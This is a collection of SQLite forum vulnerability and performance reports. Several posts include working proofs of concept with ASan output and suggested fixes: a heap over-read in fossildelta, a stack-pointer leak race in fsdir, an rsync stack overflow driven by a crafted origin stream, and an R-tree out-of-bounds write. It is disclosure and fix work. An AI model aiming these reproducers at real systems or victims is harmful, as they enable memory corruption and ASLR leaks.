title: Vuln95-76: fossildelta delta_apply() Heap Over-read via Non-NUL-terminated Delta Blob

posts.author: ylwang (yuelinwang)
posts.body:
Summary
delta_apply() (ext/misc/fossildelta.c:582), reached from the delta_apply(X,D) SQL function, runs its command loop as while( *zDelta && lenDelta>0 ), dereferencing *zDelta before the lenDelta>0 length check. deltaApplyFunc (line 717) passes the sqlite3_value_blob() bytes straight in without NUL-terminating them, so a delta that consumes exactly to the end of the buffer makes the loop condition read 1 to 2 bytes past the blob (CWE-125). delta_output_size() (line 535) guards the identical pattern in the correct order (lenDelta<=0 first), confirming line 582 is the defect.

Reproducecd /data/ylwang/LargeScan/targets/sqlite
gcc -g -O0 -fsanitize=address -shared -I. -fPIC -o fossildelta.so ext/misc/fossildelta.c

vuln95.sql:
.load ./fossildelta.so
-- Delta layout (base-64 fossil digits; 'h'=68, 'd'=40, '4'=4, '0'=0):
--   "h\n"            header, output size = 68 (>=0, passes delta_output_size)
--   "d:" + 40 'B'    literal insert of 40 bytes                 (total=40)
--   "4@0"            copy 4 bytes from src offset 0, NO trailing ','  (total=44<=68)
-- Source x'00000000' is 4 bytes so ofst+cnt = 4 <= lenSrc.
-- After the copy lenDelta=-1 and the loop re-reads *zDelta out of bounds.
SELECT typeof(delta_apply(
x'00000000',
unhex('680a643a42424242424242424242424242424242424242424242424242424242424242424242424242424242344030')
));

Run it:
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < vuln95.sql

ASAN reports a heap-buffer-overflow READ at the exact vulnerable line, 0 bytes to the right of the unhex/contextMalloc allocation:
==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 1
#0 delta_apply         ext/misc/fossildelta.c:582
#1 deltaApplyFunc      ext/misc/fossildelta.c:717
#2 sqlite3VdbeExec     sqlite3.c:104828
#3 sqlite3Step ... sqlite3_step ... shell_exec ... main

0x506000000718 is located 0 bytes to the right of 56-byte region
allocated by thread T0 here:
#0 __interceptor_malloc
#1 sqlite3MemMalloc    sqlite3.c:28239
... contextMalloc      sqlite3.c:133859
... unhexFunc          sqlite3.c:134779

SUMMARY: AddressSanitizer: heap-buffer-overflow ext/misc/fossildelta.c:582 in delta_apply

ASAN_OPTIONS=detect_leaks=0 only silences an unrelated end-of-run leak scan. The SEGV is a genuine heap out-of-bounds read on the real delta_apply execution path.

Fix
Test the length before dereferencing, matching the correct order already used by delta_output_size().
/* ext/misc/fossildelta.c delta_apply(): check lenDelta before *zDelta. */
while( lenDelta>0 && *zDelta ){
...
}

title: Vuln100-81: fileio fsdir() Uninitialized Stack Read / Info-leak on readlink() Failure

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fsdirColumn() FSDIR_COLUMN_DATA / S_ISLNK branch (ext/misc/fileio.c:838) reads a symlink into an uninitialized char aStatic[64] with while(1){ n=readlink(pCur->zPath,aBuf,nBuf); if(n<nBuf) break; ... } (fileio.c:844-845). readlink() returns -1 on error, which also satisfies n<nBuf, so the loop exits with n==-1 and aBuf still pointing at the uninitialized buffer; sqlite3_result_text(ctx, aBuf, -1, SQLITE_TRANSIENT) (fileio.c:855) treats a negative length as "NUL-terminated string" and strlen()s the uninitialized stack buffer, reading uninitialized bytes (and running past the 64-byte buffer) into the DATA column (CWE-908/CWE-457, info leak).

Reproduce
fsdirNext() lstat()s each entry and emits a row when S_ISLNK is true; the VDBE then calls fsdirColumn() which readlink()s the same path. If the symlink is removed in that TOCTOU window, readlink() fails with -1. (A merely dangling link does not trigger it — readlink() on a dangling link still succeeds; the link object itself must vanish between lstat and readlink.) The window is widened by populating the directory with thousands of links and racing background workers that continuously rm+ln -s them while fsdir() iterates.

Every link points at one fixed known target, so any DATA value that is not the target (nor a truncated substring of it) can only be uninitialized stack bytes. The fileio extension is compiled into the shell (fsdir is available directly).
#!/bin/bash
SQLITE=/data/ylwang/LargeScan/targets/sqlite/sqlite3
WORK=$(mktemp -d /tmp/fsdir_poc.XXXXXX); LINKDIR="$WORK/links"; mkdir -p "$LINKDIR"
trap 'kill $RP 2>/dev/null; wait 2>/dev/null; rm -rf "$WORK"' EXIT

TARGET="KNOWN_TARGET_STRING_0123456789ABCDEF"
TARGET_HEX=$(printf '%s' "$TARGET" | od -An -tx1 | tr -d ' \n' | tr 'a-f' 'A-F')
N=6000
for i in $(seq 1 $N); do ln -s "$TARGET" "$LINKDIR/l$i"; done

# 8 background racers open the lstat()->readlink() TOCTOU window
racer(){ while true; do for ((i=$1;i<=N;i+=8)); do rm -f "$LINKDIR/l$i"; ln -s "$TARGET" "$LINKDIR/l$i"; done; done; }
RP=""; for b in 1 2 3 4 5 6 7 8; do racer $b & RP="$RP $!"; done

# a DATA hex value that is NOT a substring of the target == leaked stack bytes
for iter in $(seq 1 400); do
OUT=$("$SQLITE" :memory: "SELECT hex(data) FROM fsdir('$LINKDIR') WHERE data IS NOT NULL;" 2>&1)
while read -r v; do
[ -z "$v" ] && continue
if ! echo "$TARGET_HEX" | grep -q "$v"; then
echo "LEAK iter=$iter hex=$v (target=$TARGET_HEX)"; exit 0
fi
done < <(echo "$OUT" | grep -v "^${TARGET_HEX}$")
done

Under the race the DATA column returned values that are neither the target nor a substring of it, e.g.:
LEAK hex=4B4E4F574E5F5441524745545F535452494E475F30313233343536373839414243444546FC7F
(= full target + trailing FC 7F: strlen ran PAST the 64-byte aStatic buffer
and appended the top bytes of a stack address 0x7ffc...)
LEAK hex=A060DD3AFC7F   (bytes A0 60 DD 3A FC 7F — a raw stack pointer)
LEAK hex=F07540F0FF7F   (bytes F0 75 40 F0 FF 7F — a raw stack pointer, unrelated to target)

The recurring trailing 7F/FF7F/FC7F are the high bytes of x86-64 user-space stack addresses (0x7fff...), i.e. live stack pointers leaked into the SQL result, defeating ASLR. ASAN does not flag it because the over-read is on an uninitialized stack buffer (ASAN without MSan/use-after-scope does not instrument uninitialized stack slots), so it is verified behaviorally via the query output channel (VERIFIED_BEHAVIOR).

Fix/* ext/misc/fileio.c fsdirColumn(): treat readlink() failure as an error/NULL. */
n = readlink(pCur->zPath, aBuf, nBuf);
if( n<0 ){
if( aBuf!=aStatic ) sqlite3_free(aBuf);
sqlite3_result_error_code(ctx, SQLITE_ERROR);  /* or result_null */
break;
}
if( n<nBuf ) break;

title: Stack overflow in sqlite3_rsync driven by compromised origin server

posts.author: drh
posts.body: Fixed by check-in 805f3acd2b0e81c8.

posts.author: drh
posts.body:
(Originally received by private email. Transcribed and reformatted to Markdown by drh)

I am writing about a vulnerability in sqlite. This is a vulnerability report that has been manually verified by David Korczynski
from Ada Logics. It was discovered by Anthropic using AI agents to study the security
of open-source software, and validated and reported by Ada Logics.

Tested at current SQLite HEAD (Fossil trunk; GitHub mirror commit
1103b10d8a0459df403275140cd30df415395145), the latest as of 2026-07-09.

In short, the overflow is triggerable with sqlite3_rsync --replica origin.db /tmp/replica.db < /tmp/poc
where /tmp/poc is generated by the script in the Dockerfile below.

1. Summary
The replica side of sqlite3_rsync reads each page of origin data into a fixed
64 KiB stack buffer (char buf[65536]). The page size it uses for that read is taken
from the origin's ORIGIN_BEGIN message and can be set to a value far larger than the
buffer, producing a deterministic, fully attacker-controlled stack-buffer-overflow.
A hostile or compromised origin that a victim syncs from can therefore smash the
stack of the victim's local replica process with content of its choosing.

2. Root cause (tool/sqlite3_rsync.c)
Three defects combine.

szOPage is read from the wire and assigned BEFORE the protocol is validated,
and readPow2() barely bounds it:
      /* readPow2() — accepts exponents 0..31, so up to 1<<31 */
      int readPow2(SQLiteRsync *p){
        int x = readByte(p);
        if( x<0 || x>=32 ){ logError(p,"read invalid page size %d\n",x); return 0; }
        return 1<<x;                 /* 1<<17 = 131072, ... 1<<30 = 1 GiB */
      }

      /* replicaSide(), case ORIGIN_BEGIN (abridged) */
      char buf[65536];                       /* :1757  fixed 64 KiB read buffer */
      ...
      closeDb(p);                            /* :1784  sqlite3_close() (v1) — see (c) */
      iProtocol = readByte(p);
      szOPage   = readPow2(p);               /* :1786  szOPage set BEFORE protocol check */
      readUint32(p, &nOPage);
      if( p->nErr ) break;
      if( iProtocol>p->iProtocol ){          /* :1793  unsupported protocol: */
          writeByte(p, REPLICA_BEGIN);
          writeByte(p, p->iProtocol);
          fflush(p->pOut);
          break;                             /* :1804  break WITHOUT nErr/finalize(pIns)/reset szOPage */
      }
      ...
      if( szRPage!=szOPage ){                /* :1859  the ONLY szOPage sanity check — */
          reportError(...);                  /*         only on the accepted-protocol path, skipped above */
          break;
      }

The real maximum SQLite page size is 65536 (1<<16); readPow2 permits up to
1<<31. The one check that would reject an oversized szOPage (szRPage != szOPage,
line 1859) is only reached on the accepted-protocol path.

The unsupported-protocol branch is a soft break. When a later ORIGIN_BEGIN
advertises a protocol the replica does not support, szOPage has ALREADY been
overwritten with the oversized value, and the handler breaks out (:1804) without
setting p->nErr, without finalizing the prepared insert pIns, and without
restoring szOPage.

closeDb() uses sqlite3_close() (v1) and ignores its return code, so a live
prepared statement is never torn down:
      static void closeDb(SQLiteRsync *p){
        if( p->db ){
          sqlite3_close(p->db);   /* :1312  returns SQLITE_BUSY while pIns is live */
          p->db = 0;              /*        p->db nulled anyway, but pIns survives */
        }
      }

With all three, a following ORIGIN_PAGE passes every guard and reaches the unbounded
read:
      /* replicaSide(), case ORIGIN_PAGE */
      if( p->nErr ) break;                 /* :1931  0 — not set by the broken renegotiation */
      if( pIns==0 ){ pIns = prepareStmt(...); if( pIns==0 ) break; }  /* :1932  pIns survived → skipped */
      ...
      readBytes(p, szOPage, buf);          /* :1938  szOPage=131072 into buf[65536] */

      /* the sink — no bound vs sizeof(buf) */
      void readBytes(SQLiteRsync *p, int nByte, void *pData){
        if( fread(pData, 1, nByte, p->pIn)==nByte ){ ... }   /* :1049  fread 131072 into 64 KiB */
      }

3. AddressSanitizer trace (real, unmodified sqlite3_rsync)==8==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x... thread T0
WRITE of size 65600 at 0x... thread T0
    #0 fread          sanitizer_common_interceptors.inc:1030
    #1 readBytes      tool/sqlite3_rsync.c:1049:7
    #2 replicaSide    tool/sqlite3_rsync.c:1938:9
    #3 main           tool/sqlite3_rsync.c:2241:5
Address 0x... is located in stack of thread T0 at offset 65648 in frame
    #0 replicaSide    tool/sqlite3_rsync.c:1752
    [112, 65648) 'buf' (line 1757) <== Memory access at offset 65648 overflows this variable
SUMMARY: AddressSanitizer: stack-buffer-overflow tool/sqlite3_rsync.c:1049:7 in readBytes

The overflow overruns buf into the saved frame pointer and replicaSide's return
address, reached entirely through the tool's normal request loop.

4. The attacker-controlled input (origin byte stream)
The malicious origin sends, in order:

ORIGIN_BEGIN  proto=1  pow2=12  nPage=1     -> szOPage=4096, session opens
ORIGIN_PAGE   pgno=1 + a valid 4096-byte page-1 image
        pIns is prepared and the first sqlite3_step() succeeds; p->nErr stays 0
ORIGIN_BEGIN  proto=255  pow2=17  nPage=1
         closeDb() runs first but sqlite3_close() returns SQLITE_BUSY (pIns live),
           szOPage becomes 131072, iProtocol(255) > replica proto ⇒ soft break;
           p->nErr==0, pIns!=0, szOPage left at 131072
ORIGIN_PAGE   pgno=1 + 65600 bytes of payload
         guards pass ⇒ readBytes(p, 131072, buf[65536]) overflows the stack

Only the origin byte stream is attacker-controlled; the replica needs no special
flags or configuration.

5. Impact
In the documented usage sqlite3_rsync ORIGIN REPLICA, when ORIGIN is remote
(sqlite3_rsync user@origin-host:origin.db local.db) the victim's local machine
runs replicaSide(), reading the origin's ORIGIN_* messages from the ssh pipe — so
the overflowing bytes are entirely origin-controlled. A hostile or compromised
origin can drive the victim's replica process into a deterministic linear
stack-buffer-overflow with attacker-chosen length (pow2 17..31 ⇒ 128 KiB … ~2 GiB)
and attacker-chosen content that reaches the saved return address: a reliable
denial of service and a candidate for control-flow hijack / RCE on the victim's
machine (subject to stack-canary / ASLR hardening). This is the same user-initiated
trust model as client-side git / rsync / scp vulnerabilities — the victim only has
to sync from an origin the attacker controls. The defect is in the sqlite3_rsync
tool, not the core libsqlite3 library, so applications embedding SQLite are
unaffected; only users of sqlite3_rsync are at risk.

6. Self-contained reproducer (single Dockerfile)
Save the block below as Dockerfile in an empty directory and run:
    docker build -t sqlite3-rsync-poc .
    docker run --rm sqlite3-rsync-poc

It clones SQLite at the tested commit, generates the amalgamation with the stock
toolchain, builds the UNMODIFIED sqlite3_rsync tool under AddressSanitizer exactly
as main.mk's RSYNC_OPT specifies, and feeds the malicious origin stream to the
tool's real --replica mode (the hidden mode the local side spawns on the remote
host). Expected result: the ASan stack-buffer-overflow report in section 3,
EXIT=134. No files other than this Dockerfile are needed (the PoC generator is
embedded in it).
----------------------------8<---------------------------- Dockerfile
# syntax=docker/dockerfile:1
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=1103b10d8a0459df403275140cd30df415395145
ARG CLANG_VERSION=20
RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make gcc build-essential pkg-config libc6-dev \
        tcl tcl-dev zlib1g-dev python3 \
        wget gnupg lsb-release software-properties-common \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*
ENV CC=clang-${CLANG_VERSION} CXX=clang++-${CLANG_VERSION}
RUN git clone https://github.com/sqlite/sqlite /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}
RUN CC=gcc ./configure && make sqlite3.c sqlite3.h
RUN clang-${CLANG_VERSION} -g -fno-omit-frame-pointer -O1 -fsanitize=address \
        -I. \
        -DSQLITE_ENABLE_DBPAGE_VTAB \
        -DSQLITE_THREADSAFE=0 \
        -DSQLITE_OMIT_LOAD_EXTENSION \
        -DSQLITE_OMIT_DEPRECATED \
        tool/sqlite3_rsync.c sqlite3.c \
        -o /usr/local/bin/sqlite3_rsync -lm -lpthread
RUN test -x /usr/local/bin/sqlite3_rsync
COPY <<'GENPOC_EOF' /gen_poc.py
#!/usr/bin/env python3
# Build the malicious ORIGIN-side byte stream that drives a local replicaSide()
# (sqlite3_rsync --replica) into a stack-buffer-overflow.
import struct, sys, sqlite3, os
def u32(x): return struct.pack(">I", x)
# A valid 4096-byte page-1 so the first ORIGIN_PAGE insert succeeds (nErr stays 0):
tmp = "/tmp/_origin_template.db"
if os.path.exists(tmp): os.remove(tmp)
con = sqlite3.connect(tmp)
con.execute("PRAGMA page_size=4096"); con.execute("PRAGMA journal_mode=DELETE")
con.execute("CREATE TABLE t(x)"); con.execute("INSERT INTO t VALUES(1)")
con.commit(); con.close()
with open(tmp, "rb") as f: page1 = f.read(4096)
assert len(page1) == 4096
out = bytearray()
# Session 1: open DB, prepare pIns via a successful ORIGIN_PAGE
out += b"\x41" + b"\x01" + b"\x0c" + u32(1)          # ORIGIN_BEGIN proto=1 pow2=12(4096) nPage=1
out += b"\x44" + u32(1) + page1                       # ORIGIN_PAGE pgno=1 + valid page
# Session 2: renegotiate to an unsupported protocol -> soft break, oversized szOPage
out += b"\x41" + b"\xff" + b"\x11" + u32(1)          # ORIGIN_BEGIN proto=255 pow2=17(131072) nPage=1
# Final ORIGIN_PAGE: overflow (nErr==0, pIns!=0) -> readBytes(p,131072,buf[65536])
out += b"\x44" + u32(1)
out += bytes(((i * 37 + 11) & 0xff) for i in range(65536 + 64))   # 65600 bytes
with open(sys.argv[1] if len(sys.argv) > 1 else "/tmp/poc", "wb") as f: f.write(out)
print("wrote poc: %d bytes" % len(out))
GENPOC_EOF
RUN python3 /gen_poc.py /tmp/poc
ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-${CLANG_VERSION}/bin/llvm-symbolizer

title: Off-by-one OOB heap write in R-tree extension (anQueue array)

posts.author: Mohammad Hossein Abedini (Ar4dAbedini)
posts.body:
Hi SQLite Team,

I found an off-by-one heap write in SQLite's R-tree extension. The anQueue array in rtree.c is allocated with space for n elements but is indexed from 1 to n inclusive during a restructuring operation, so the write at index n goes one slot past the end of the allocation. This is reachable with a specially shaped R-tree.

Root Cause
File: ext/rtree/rtree.c

Struct declaration (line 309):
c
u32 anQueue[RTREE_MAX_DEPTH+1];   /* 41 elements, valid indices 0..40 */

Trigger in rtreeFilter() (line 1998):
c
pNew = rtreeSearchPointNew(pCsr, RTREE_ZERO, (u8)(pRtree->iDepth+1));

When pRtree->iDepth == 40, the level passed is (u8)(40+1) = 41.

OOB write in rtreeSearchPointNew() (line 1543):
c
static RtreeSearchPoint rtreeSearchPointNew(
RtreeCursor *pCur,
RtreeDValue rScore,
u8 iLevel             / iLevel = 41 here /
){
RtreeSearchPoint *pNew, *pFirst;
pFirst = rtreeSearchPointFirst(pCur);
pCur->anQueue[iLevel]++;    / ← anQueue[41]: ONE PAST END OF ARRAY /
/ ... */

Depth validation (line 791–793) accepts iDepth == 40:
c
pRtree->iDepth = readInt16(pNode->zData);
if( pRtree->iDepth>RTREE_MAX_DEPTH ){    /* strictly greater — 40 passes */
rc = SQLITE_CORRUPT_VTAB;

Matching decrement
rtreeSearchPointPop() (line 1613) performs:
c
p->anQueue[p->sPoint.iLevel]--;

When sPoint.iLevel == 41, this decrements the same OOB location. The net effect on the adjacent heap word is +1 then -1, but the window between these two writes spans the entire tree traversal. If an error causes early return (e.g., SQLITE_NOMEM), the decrement may never execute, leaving the adjacent heap permanently corrupted.

Proof of Concept
This Python script creates a minimal .db with a crafted rtree table to trigger the issue:

python

#!/usr/bin/env python3
import struct, os, sqlite3

def make_rtree_db(path):
if os.path.exists(path):
os.unlink(path)

db = sqlite3.connect(path)
db.execute('CREATE VIRTUAL TABLE r3tree USING rtree(id, minx, maxx, miny, maxy)')
db.executemany('INSERT INTO r3tree VALUES(?,?,?,?,?)',
[(i, i, i+1, i, i+1) for i in range(100)])
db.commit()

root_blob = db.execute("SELECT data FROM r3tree_node WHERE nodeno=1").fetchone()[0]
root_bytes = bytearray(root_blob)
root_bytes[0] = 0x00
root_bytes[1] = 0x28  # 40 = RTREE_MAX_DEPTH
db.execute("UPDATE r3tree_node SET data=? WHERE nodeno=1", (bytes(root_bytes),))
db.commit()
db.close()
print(f"[*] Created crafted rtree db: {path}")

def trigger(path):
db = sqlite3.connect(path)
print("[*] Triggering: SELECT * FROM r3tree ...")
try:
list(db.execute("SELECT * FROM r3tree WHERE minx <= 100"))
except Exception as e:
pass
db.close()

if name == 'main':
path = 'rtree_oob.db'
make_rtree_db(path)
trigger(path)

Running this with ASAN enabled yields a heap-buffer-overflow on anQueue[41].

Suggested Fix
Either make the depth comparison inclusive (>= instead of >) in rtree.c line 792, or increase the array size to RTREE_MAX_DEPTH+2.

title: FTS5 Uninitialized Memory Read in `fts5DataRead`

posts.author: Mohammad Hossein Abedini (Ar4dAbedini)
posts.body:
Hi SQLite Team,

I found an uninitialized memory read in SQLite's FTS5 full-text search implementation. In certain paths within fts5_index.c, fts5DataRead() returns an Fts5Data blob with partially uninitialized padding bytes, and the caller reads from it. This is reachable via a crafted FTS5 query against a modified database.

Root Cause
File: ext/fts5/fts5_index.c
Function: fts5DataRead() (~line 897–901)
}else{
/* TODO1: Fix this */
pRet->p[nByte] = 0x00;      // zeroes byte at p[nByte]
pRet->p[nByte+1] = 0x00;    // zeroes byte at p[nByte+1]
pRet->szLeaf = fts5GetU16(&pRet->p[2]);  // reads p[2] AND p[3]
}

fts5GetU16 reads two bytes. For a blob of size nByte:

When nByte == 1: p[2] is zeroed (it's p[nByte+1]), but p[3] is uninitialized.
When nByte == 0: p[1] and p[2] are zeroed, but p[3] is still uninitialized; fts5GetU16(&p[2]) reads p[2]=0x00 and p[3]=uninit.

This contrasts with fts5StructureRead(), which patches this after the fact by memset-ing all FTS5_DATA_PADDING bytes, but that does not fix the read of p[3] that already occurred inside fts5DataRead.

MSan Proof-of-Concept
Confirmed with MemorySanitizer (-fsanitize=memory -O0):
==16445==WARNING: MemorySanitizer: use-of-uninitialized-value
#0 fts5GetU16          sqlite3.c:251127  (reads p[3])
#1 fts5DataRead        sqlite3.c:251315
#2 fts5StructureReadUncached  sqlite3.c:251694
#3 fts5StructureRead   sqlite3.c:251754
#4 sqlite3Fts5IndexLoadConfig  sqlite3.c:258231
#5 fts5FilterMethod    sqlite3.c:261562

Minimal Reproducer (SQL)
A crafted .db file with t1_data.block (rowid=10) set to a 1-byte value is sufficient to trigger the bug. If SQLITE_DBCONFIG_DEFENSIVE is disabled, this can be triggered via SQL:
CREATE VIRTUAL TABLE t1 USING fts5(content);
UPDATE t1_data SET block = x'ff' WHERE id = 10;
-- Close and reopen DB to clear cache, then:
SELECT * FROM t1('hello');

Suggested Fix
In fts5DataRead, replace the partial zeroing with a full memset:
/* After (correct): */
memset(&pRet->p[nByte], 0x00, FTS5_DATA_PADDING);

Reporter: Mohammad Hossein Abedini
Email: mhmd.abedinii@gmail.com

https://sqlite.org/src/info/fe52900694

title: Possible signed integer overflow in sqlite3Update() with extreme number of indexes

posts.author: a6y55 (a6y555)
posts.body:
SQLite version: 3.53.2
Source id: d6e03d8c777cfa2d35e3b60d8ec3e0187f3e9f99d8e2ee9cac695fd6fcdf1a24

I found a possible signed integer overflow in sqlite3Update() when a table has an extreme number of indexes.

In src/update.c:424-429, sqlite3Update() counts indexes into a signed int nIdx:
for(nIdx=0, pIdx=pTab->pIndex; pIdx; pIdx=pIdx->pNext, nIdx++){
...
pParse->nTab++;
}

In the 3.53.2 amalgamation, the same code is at sqlite3.c:160021-160026.

Later the value is used in expressions at src/update.c:441-446
(amalgamation: sqlite3.c:160038-160043), such as:
sizeof(int) * (pTab->nCol+nIdx+1) + nIdx+2
aRegIdx+nIdx+1
memset(aToOpen, 1, nIdx+1)
aToOpen[nIdx+1] = 0

If the per-table index count grows close to INT_MAX, the nIdx increment,
pParse->nTab increment, or later nIdx+1 expressions can overflow signed int.

The natural SQL shape is:
CREATE TABLE t(a INTEGER, b TEXT);
CREATE INDEX i_0000000000 ON t(a);
CREATE INDEX i_0000000001 ON t(a);
...
UPDATE t SET b='y' WHERE a=1;

The trigger requires approximately INT_MAX indexes on one table.

Suggested fix direction:
Add an explicit upper-bound check while counting pTab->pIndex / incrementing
pParse->nTab, and use checked or widened arithmetic before computing nIdx+1 and
the allocation layout.

title: Bloom Filter on TEXT-Only Indexed Join Adds Work but Prunes Nothing

posts.author: Jeff Z Chen (zhiychen)
posts.body:
The following has been verified by humans, not purely AI-generated.

Summary
whereCheckIfBloomFilterIsUseful() can select a Bloom filter for a regular indexed join whose equality keys have TEXT affinity.

For string values, this filter cannot distinguish keys: filterHash() in src/vdbe.c deliberately hashes every string to the same constant. Once one string key has been added, every string probe returns “maybe present.” SQLite therefore builds and probes the filter but still performs every index seek.

This is a performance issue only; query results remain correct.

Tested versions
The behavior was reproduced with the same SQLite check-in on two platforms:

Linux x86_64: SQLite 3.54.0, source ID 2026-07-13 14:52:13 be673351eb, default build options.
macOS 26.3 arm64: SQLite 3.54.0, full source ID be673351ebdeba8e78ee11941ecb3e178e4d5212ff07f1d2790320af1d52e6a0, built with ./configure && make sqlite3.

ReproductionCREATE TABLE big(a INTEGER PRIMARY KEY, b TEXT);
CREATE TABLE small(k TEXT PRIMARY KEY, v TEXT) WITHOUT ROWID;

INSERT INTO big(b)
SELECT printf('k%07d', value) FROM generate_series(0,99999);
INSERT INTO small(k,v)
SELECT printf('k%07d', value*1000), 'payload'
FROM generate_series(0,99);

ANALYZE;
.eqp on
.stats stmt

SELECT count(*)
FROM big CROSS JOIN small
WHERE small.k=big.b AND small.v<>'nope';

Observed on both platforms:
QUERY PLAN
|--SCAN big
|--BLOOM FILTER ON small (k=?)
`--SEARCH small USING PRIMARY KEY (k=?)

100
...
Bloom filter bypass taken:           0/100000

Only 100 probes match, yet none of the 99,900 non-matching probes are bypassed.

As a control, changing b and k to INT and inserting integer values produces the same result and plan shape, but:
Bloom filter bypass taken:           99900/100000

Performance
With 1,000,000 outer rows and the same 100-row inner table:

Platform
Bloom enabled
Bloom disabled
Slowdown

Linux x86_64, 5 runs
0.08016s mean
0.07232s mean
10.8%

macOS arm64, 10 alternating runs
0.03411s mean
0.03067s mean
11.2%

On macOS, statement statistics also showed 7,001,017 virtual-machine steps with the filter versus 5,000,313 with .testctrl opt -BloomFilter.

Cause
filterHash() explicitly gives all strings the same hash:
/* All strings have the same hash and all blobs have the same hash */
h += 4093 + (p->flags & (MEM_Str|MEM_Blob));

The automatic-index path already avoids this case. Its useBloomFilter flag is set only if at least one key expression does not have TEXT affinity, with a comment explaining that a Bloom filter on text is usually unhelpful because all strings share a hash.

The regular-index path in whereCheckIfBloomFilterIsUseful() has no equivalent affinity check before setting WHERE_BLOOMFILTER. This is why the filter is avoided for a TEXT-only automatic index but selected for the ordinary primary-key index above.

The constant string hash was introduced to preserve correctness for collations where different byte strings compare equal; see https://sqlite.org/forum/forumpost/0846211821.

Scope note
TEXT affinity does not guarantee that every runtime value is a string; such columns may also contain NULL or BLOB values. The demonstrated claim is narrower: when the join keys are strings, as in this reproduction, the filter cannot discriminate their contents and prunes nothing.

Suggested fix
Mirror the existing automatic-index heuristic in whereCheckIfBloomFilterIsUseful(): do not set WHERE_BLOOMFILTER when all equality-key terms have TEXT affinity.

A content-sensitive string hash could be considered separately, but it is more invasive because it must respect the comparison's collating sequence.

posts.author: Jeff Z Chen (zhiychen)
posts.body:
Follow-up to my earlier report: a Bloom filter is chosen for TEXT-affinity equality joins, but filterHash() hashes every string identically, so 0 probes are ever bypasse.

The guard for this already exists on the auto-index path (check-in 4990fc84f, released 3.42.0: "only use a Bloom filter on an automatic index if one or more key columns can take on non-TEXT values"). whereCheckIfBloomFilterIsUseful() has no such check, so the asymmetry has stood since 3.42.0.

Not asking to change the hash (it's needed for collation correctness); just to not select a filter that prunes nothing, which can't change results.

Suggested fix: don't set WHERE_BLOOMFILTER when all equality-key terms have TEXT affinity. Happy to send a patch with test results if needed.

This is an artifact of the limited precision IEEE754 floating-point number format.
The value 9223372036854775808.0 seems precise, but it is really only accurate to
the first 15.9546 digits.  The decimal representation show has 19 significant digits.
The same 64-bit double that represents 9223372036854775808.0 also represents every other
value between 9223372036854774784.0 and 9223372036854777856.0.  They are all
the same number, at least according to the IEEE754 hardware built into your CPU.

When converting from floating-point to integer (the rowid is an integer) the
machine can pick any number it wants within that range.  And 9223372036854775807
is within that range.

NOT A BUG

posts.author: drh
posts.body:
Let me say this is a different way:  9223372036854775808.0 and 9223372036854775807.0 have the
exact same representation in the IEEE754 floating-point format used by your CPU, specifically
the bit pattern:  0x43e0000000000000.  So one or the other of the following must be true:

9223372036854775808.0 == 9223372036854775807
9223372036854775807.0 <> 9223372036854775807

Since the LHS of each of these comparisons is the same, they cannot both be true at once.
As the saying goes, you have to choose your poison.  SQLite chooses the first case.

title: SQLite: adding OR FALSE disables an otherwise usable index search

posts.author: cl hl (chen8908917)
posts.body:
Description
The boolean identity P OR FALSE is equivalent to P, including under SQL three-valued logic. Adding OR FALSE to an indexed equality predicate should therefore not change the selected access path.

SQLite does not simplify this expression before access-path selection. A direct equality predicate uses a covering index search, while the equivalent expression containing OR FALSE performs a full table scan.

Expected behavior
SQLite should simplify:
P OR FALSE

to P before selecting an access path. Both queries should use idx_t_x and have comparable execution times.

Actual behavior
The original query plan is:
SEARCH t USING COVERING INDEX idx_t_x (x=?)

After adding OR FALSE, the plan becomes:
SCAN t

With 2,000,000 rows, warm-up executions, and alternating execution order:

Query
Median execution time

x = 1
0.010 ms

x = 1 OR FALSE
35.116 ms

The equivalent query containing OR FALSE was approximately 3638.94 times slower. Both queries returned 2.

How to repeat
Run the following complete SQL script in SQLite:
SELECT sqlite_version();

DROP TABLE IF EXISTS t;

CREATE TABLE t(
id INTEGER PRIMARY KEY,
x INTEGER NOT NULL
);

CREATE INDEX idx_t_x ON t(x);

WITH RECURSIVE seq(i) AS (
SELECT 1
UNION ALL
SELECT i + 1
FROM seq
WHERE i < 2000000
)
INSERT INTO t(id, x)
SELECT i, i % 1000000
FROM seq;

ANALYZE;

-- Uses idx_t_x.
EXPLAIN QUERY PLAN
SELECT COUNT(*)
FROM t
WHERE x = 1;

SELECT COUNT(*)
FROM t
WHERE x = 1;

-- Logically equivalent, but performs a full table scan.
EXPLAIN QUERY PLAN
SELECT COUNT(*)
FROM t
WHERE x = 1 OR FALSE;

SELECT COUNT(*)
FROM t
WHERE x = 1 OR FALSE;

Confirm that both statements return 2. The first EXPLAIN QUERY PLAN output reports an index search, while the second reports SCAN t.

For stable timing results, execute both statements several times for warm-up and alternate their execution order over multiple repetitions.

VersionSQLite 3.50.4

posts.author: drh
posts.body: This new optimization is implemented by check-in 2f0bde4bc89c2b08.

title: SQLite: duplicate GROUP BY expressions are not eliminated and force a temporary B-tree

posts.author: cl hl (chen8908917)
posts.body:
Description
Grouping by the same expression twice is redundant:
GROUP BY x, x

is equivalent to:
GROUP BY x

SQLite does not remove the duplicate grouping key. When an index already provides rows ordered by x, the single-key query can aggregate directly from a covering index scan. Adding the duplicate expression causes SQLite to allocate and use a temporary B-tree for grouping.

Expected behavior
SQLite should canonicalize duplicate grouping expressions before choosing the aggregation strategy. Both queries should use the same covering-index grouping plan.

Actual behavior
Without the duplicate key:
SCAN t USING COVERING INDEX idx_t_x

With GROUP BY x, x:
SCAN t USING COVERING INDEX idx_t_x
USE TEMP B-TREE FOR GROUP BY

With 2,000,000 rows, PRAGMA temp_store=MEMORY, warm-up executions, and alternating execution order:

Query
Median execution time

GROUP BY x
438.962 ms

